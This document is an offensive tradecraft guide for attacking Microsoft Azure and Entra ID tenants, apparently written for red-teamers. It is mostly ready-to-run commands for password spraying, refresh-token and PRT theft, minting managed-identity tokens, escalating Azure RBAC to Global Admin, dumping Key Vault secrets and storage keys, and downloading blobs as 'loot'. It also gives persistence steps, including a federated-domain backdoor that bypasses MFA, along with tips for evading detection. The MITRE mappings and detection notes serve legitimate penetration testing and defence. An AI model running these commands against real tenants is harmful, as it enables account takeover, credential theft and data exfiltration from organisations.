# Azure & Entra ID Attack Guide

Offensive tradecraft for Microsoft Azure and **Entra ID** (formerly Azure AD):
unauthenticated tenant recon, password attacks against the identity plane, token
theft, managed-identity abuse, Azure RBAC privilege escalation, the Entra-ID→Azure
and Azure→Entra-ID escalation bridges, lateral movement, and persistence. Grounded
in 2025-2026 tradecraft (ROADtools, AzureHound/BloodHound CE, TokenTactics, MicroBurst,
AADInternals, Storm-0501 / Void Blizzard campaign TTPs).

> **Two control planes, two RBAC systems.** Azure separates **Entra ID** (identity:
> users, groups, app registrations, service principals, directory roles like Global
> Administrator) from **Azure Resource Manager / ARM** (subscriptions, resource groups,
> resources, governed by *Azure RBAC* roles like Owner/Contributor). Privesc almost
> always means crossing **between** these two planes. Know which one you're in.

```
Entra ID plane (identity)              Azure RBAC plane (resources)
  Global Admin, PIM roles                 Owner / Contributor / UAA
  app reg / service principals     ◄──►   subscriptions / VMs / storage
  Conditional Access                       managed identities
```

---

## 0. Identifiers & Token Cheat-Sheet

| Thing | Looks like / where |
|-------|--------------------|
| Tenant ID | GUID; `login.microsoftonline.com/<tenant>/.well-known/openid-configuration` |
| Object ID | GUID for any Entra object (user/group/SP) |
| App (client) ID | GUID on an app registration |
| **Access token** | JWT (decode at jwt.ms) — `aud` = the resource (Graph, ARM, KeyVault) |
| **Refresh token** | long-lived; **FOCI** refresh tokens work across many first-party apps |
| **PRT** | Primary Refresh Token — device-bound SSO artifact, very high value |

Key audiences (`aud`) you'll target: `https://graph.microsoft.com` (Entra),
`https://management.azure.com` (ARM), `https://vault.azure.net` (Key Vault),
`https://storage.azure.com`.

---

## 1. Unauthenticated Recon

### Tenant discovery & user/domain validation

```bash
# Does the org use Entra ID? What's the tenant ID, federation, namespaces?
curl -s "https://login.microsoftonline.com/acme.com/.well-known/openid-configuration" | jq .
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@acme.com&xml=1"   # Managed vs Federated

# AADInternals (PowerShell) — tenant recon without creds
Invoke-AADIntReconAsOutsider -DomainName acme.com   # tenant id, brand, MX, DKIM, sync, MDI

# User enumeration (valid vs invalid) — quiet via GetCredentialType / OneDrive
# https://github.com/dafthack/MSOLSpray , https://github.com/treebuilder/aad-sso-enum-brute-spray
```

### App / resource OSINT

```bash
# Public blob containers (Azure's "public S3 buckets")
# https://github.com/NetSPI/MicroBurst  (Invoke-EnumerateAzureBlobs)
Invoke-EnumerateAzureBlobs -Base acme           # guesses acme*.blob.core.windows.net + containers

# App Service / Function / API Mgmt / static sites in DNS
subfinder -d acme.com -silent | httpx -silent -title \
  | grep -Ei 'azurewebsites|azure-api|blob.core|cloudapp|trafficmanager'
```

---

## 2. Credential Access (Identity Plane)

### 2.1 Password spraying Entra ID

```bash
# MSOLSpray — low-and-slow spray; respects lockout, flags MFA/disabled/expired
# https://github.com/dafthack/MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password 'Spring2026!' -Verbose

# TREVORspray (smart, proxy-aware) / o365spray as alternatives
trevorspray -u users.txt -p 'Spring2026!'
```

> Watch for **Smart Lockout**, Conditional Access, and **MFA** — a "success but MFA
> required" is still gold for token/phishing follow-ups. Spray **one password across
> many users**, not the reverse.

### 2.2 Token theft & abuse (the modern path)

```powershell
# TokenTactics / TokenTacticsV2 — request tokens with a device-code or stolen refresh token
# https://github.com/f-bader/TokenTacticsV2
Get-AzureToken -Client Graph                      # interactive / device code flow
RefreshTo-MSGraphToken -domain acme.com -refreshToken <RT>
RefreshTo-AzureManagementToken -domain acme.com -refreshToken <RT>   # ARM
RefreshTo-AzureKeyVaultToken  -domain acme.com -refreshToken <RT>    # Key Vault

# FOCI abuse: one family-of-client-IDs refresh token → tokens for many first-party apps
# Device-code phishing: send the code to a victim; capture tokens on completion
```

```powershell
# AADInternals — extract tokens, dump on-prem sync creds, manipulate
Get-AADIntAccessTokenForAADGraph -SaveToCache
Export-AADIntLocalDeviceCertificate                  # device cert → PRT path
```

### 2.3 PRT theft (domain-joined / AADJ endpoints)

```text
# On a compromised Entra-joined Windows host, a Primary Refresh Token = SSO to everything.
ROADtoken / requestaadrefreshtoken / Mimikatz (sekurlsa::cloudap) / browsercore
# Then exchange the PRT cookie for tokens to Graph/ARM. High-value, EDR-watched.
```

---

## 3. Authenticated Enumeration

### 3.1 ROADtools (Entra ID graph dump + explore)

```bash
# https://github.com/dirkjanm/ROADtools
roadrecon auth -u user@acme.com -p 'Pass'          # or -r <refreshtoken> / --device-code
roadrecon gather                                    # pulls the entire directory via Graph
roadrecon gui                                        # browse users/groups/apps/roles/CA at http://127.0.0.1:5000
# roadtx for advanced token manipulation / PRT / app auth
```

### 3.2 AzureHound → BloodHound CE (attack paths)

```bash
# https://github.com/SpecterOps/AzureHound  (now weaponized in the wild — Storm-0501, Void Blizzard)
azurehound -u user@acme.com -p 'Pass' --tenant <tenantid> list -o azure.json
azurehound -r <refreshtoken> --tenant <tenantid> list -o azure.json
# Import azure.json into BloodHound CE → hunt:
#   "Shortest path to Global Admin", "AZ paths to subscriptions/VMs", AddMember/owner abuse
```

### 3.3 PowerShell modules & CLI

```powershell
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgUser -All; Get-MgGroup -All
Get-MgRoleManagementDirectoryRoleAssignment -All     # who holds directory roles
Get-MgServicePrincipal -All                          # app SPs (and their credentials/permissions)

# Azure CLI for ARM-side recon
az login
az account list -o table                             # subscriptions you can see
az role assignment list --all -o table               # Azure RBAC assignments
az resource list -o table
az vm list -o table; az storage account list -o table; az keyvault list -o table
az ad signed-in-user show
```

---

## 4. Azure RBAC Privilege Escalation (resource plane)

### 4.1 Managed-identity abuse (the Azure "IMDS")

A VM/App Service/Function/Container with a **managed identity** carries an Azure RBAC
role. From inside the resource, hit the local IMDS to mint ARM/KeyVault tokens.

```bash
# From a compromised Azure VM (IMDS at 169.254.169.254, requires the Metadata header)
curl -s -H "Metadata: true" \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .
# Token for Key Vault:
curl -s -H "Metadata: true" \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq .
# Instance metadata (subscription, resource group, name):
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .
```

```bash
# App Service / Functions use an env-based endpoint instead of 169.254.169.254:
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
     -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

Use the resulting ARM token with `az` (`az login --identity` on-box) or raw REST.

### 4.2 Azure RBAC privesc primitives

```bash
# P1. You hold Owner/User Access Administrator → grant yourself anything
az role assignment create --assignee <me> --role Owner --scope /subscriptions/<sub>

# P2. Contributor on a VM → run code as the VM's (possibly more privileged) managed identity
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"

# P3. Contributor → deploy an ARM template / Automation runbook / Function that uses a privileged identity
az deployment group create -g <rg> --template-file evil.json

# P4. Key Vault access (get/list) → pull secrets, certs, keys (often DB creds, SP creds, SSH keys)
az keyvault secret list --vault-name <kv> -o table
az keyvault secret show  --vault-name <kv> -n <secret> --query value -o tsv

# P5. Storage account keys → full data-plane access regardless of RBAC
az storage account keys list -g <rg> -n <acct>
az storage blob list --account-name <acct> --account-key <key> -c <container> -o table

# P6. Automation Account / Runbook → run PowerShell as the account's Run-As identity
# P7. Reader-everywhere + misconfig: read deployment params, Function app settings (secrets in plaintext)
az functionapp config appsettings list -g <rg> -n <fn>     # connection strings, keys
```

### 4.3 The escalation bridges (cross-plane)

```text
Entra ID  ──►  Azure RBAC
  - Global Admin can toggle "Access management for Azure resources" (elevate) and
    grant itself User Access Administrator at the ROOT (/) scope → owns all subs.
    az rest --method post \
      --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

Azure RBAC  ──►  Entra ID  (the dangerous one in 2025 engagements)
  - Owner/Contributor on a subscription that contains a VM/Automation acct whose
    MANAGED IDENTITY or Run-As SP holds an Entra directory role (e.g. an SP granted
    RoleManagement.ReadWrite.Directory or member of a privileged group).
  - Run code on that resource → mint the identity's Graph token → add yourself to a
    privileged group / assign Global Admin / add an SP credential. Owner of one sub
    can become Global Admin of the tenant.
```

### 4.4 App registration / service principal abuse

```bash
# Add a new client secret/cert to an existing privileged SP → log in as it later (stealthy persistence)
az ad app credential reset --id <appId> --append           # new secret
# Or via Graph: POST /servicePrincipals/{id}/addPassword
# If you can grant app roles: assign Directory.ReadWrite.All / RoleManagement.ReadWrite.Directory
#   then the SP can self-elevate to Global Admin equivalent.
```

---

## 5. Lateral Movement & Data

```bash
# Run commands across VMs (no SSH needed) — Contributor
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts "id"

# Hybrid pivot: Entra Connect / sync server holds on-prem DA-adjacent creds (AADInternals)
Get-AADIntSyncCredentials                                 # MSOL_ account password (on the sync host)

# Bastion / Serial Console / Just-in-time access if RBAC allows
# Storage / Cosmos / SQL exfil via account keys or managed-identity tokens
az storage blob download-batch -s <container> -d ./loot --account-name <acct> --account-key <key>
```

---

## 6. Persistence

| Technique | How | T-ID |
|-----------|-----|------|
| App/SP secret or cert | `az ad app credential reset --append` | T1098.001 |
| New owner on an app/SP | add yourself as owner → reset its creds | T1098 |
| Federated domain backdoor | AADInternals `ConvertTo-AADIntBackdoor` (any-user sign-in) | T1556.007 |
| Eligible→active PIM abuse | self-activate dormant eligible roles | T1098 |
| Guest/B2B invite | invite attacker tenant user, grant roles | T1136.003 |
| Conditional Access tamper | exclude attacker from MFA/policies | T1556 |
| Automation runbook backdoor | scheduled runbook with priv identity | T1053 |

```powershell
# Federated-domain backdoor: forge SAML for ANY user in the tenant (very stealthy, very loud if caught)
ConvertTo-AADIntBackdoor -DomainName acme.com
Open-AADIntOffice365Portal -tenant <id> -user admin@acme.com -UseBuiltInCertificate -ByPassMFA $true
```

---

## 7. Defense Evasion & OPSEC

- **Entra sign-in logs + Unified Audit Log** capture interactive sign-ins, token
  requests, role changes, and app-credential adds. AzureHound/ROADtools collection is
  Graph-heavy and **detectable** (Microsoft attributes in-the-wild AzureHound use to
  Storm-0501 and Void Blizzard).
- Prefer **refresh-token / FOCI** reuse over fresh password auth to avoid new
  risky-sign-in scoring; respect Conditional Access locations (geo-velocity flags).
- `elevateAccess`, root-scope role grants, and federated-domain changes are
  **high-signal** — only with explicit RoE. Defender for Cloud Apps + Microsoft
  Sentinel analytics watch for them.
- Managed-identity token requests from inside a VM are normal traffic; abusing them is
  quieter than identity-plane password attacks.

---

## 8. Tooling Quick Reference

| Tool | One-liner | Use |
|------|-----------|-----|
| **ROADtools** | `roadrecon gather && roadrecon gui` | Entra directory dump + explorer |
| **AzureHound** | `azurehound -r <RT> --tenant <id> list -o azure.json` | Attack-path collection → BloodHound CE |
| **AADInternals** | `Invoke-AADIntReconAsOutsider -DomainName acme.com` | Recon, tokens, sync creds, backdoors |
| **MicroBurst** | `Invoke-EnumerateAzureBlobs -Base acme` | Blob/resource enum, secret dumping |
| **TokenTacticsV2** | `RefreshTo-AzureManagementToken -refreshToken <RT>` | Cross-resource token minting |
| **MSOLSpray** | `Invoke-MSOLSpray -UserList u.txt -Password p` | Entra password spray |
| **Stormspotter / Azucar** | GUI graph / config audit | Visualize + audit |
| **az / Az PowerShell / Mg** | `az role assignment list --all` | Native enumeration & action |
| **Prowler / ScoutSuite** | `prowler azure` / `scout azure` | Posture audit (service map) |

---

## 9. MITRE ATT&CK Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Valid Accounts: Cloud | T1078.004 | Stolen tokens / sprayed creds |
| Brute Force: Password Spraying | T1110.003 | MSOLSpray |
| Steal Application Access Token | T1528 | Refresh/FOCI/PRT theft |
| Unsecured Credentials: Cloud Metadata | T1552.005 | Managed-identity IMDS |
| Cloud Service / Infra Discovery | T1526 / T1580 | ROADtools, AzureHound |
| Permission Groups Discovery: Cloud | T1069.003 | Role assignment enum |
| Account Manipulation: Add Cloud Creds | T1098.001 | SP secret/cert add |
| Modify Authentication: Federation | T1556.007 | AADInternals domain backdoor |
| Create Cloud Account | T1136.003 | Guest/B2B persistence |
| Cloud Admin Account Manipulation | T1098 | elevateAccess / GA grant |

---

## References

- ROADtools (dirkjanm): https://github.com/dirkjanm/ROADtools
- AzureHound (SpecterOps): https://github.com/SpecterOps/AzureHound
- AADInternals: https://aadinternals.com/aadinternals/
- NetSPI MicroBurst: https://github.com/NetSPI/MicroBurst
- TokenTacticsV2: https://github.com/f-bader/TokenTacticsV2
- Praetorian — Azure RBAC Privilege Escalations (Azure VM): https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/
- RedFox Security — Entra ID Exploitation, PrivEsc & Persistence: https://www.redfoxsec.com/blog/entra-id-azure-ad-exploitation-privilege-escalation-persistence
- HackTricks Cloud — Azure Pentesting: https://cloud.hacktricks.xyz/pentesting-cloud/azure-security
- Microsoft — Void Blizzard / Storm-0501 AzureHound activity: https://www.microsoft.com/en-us/security/blog/
- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/
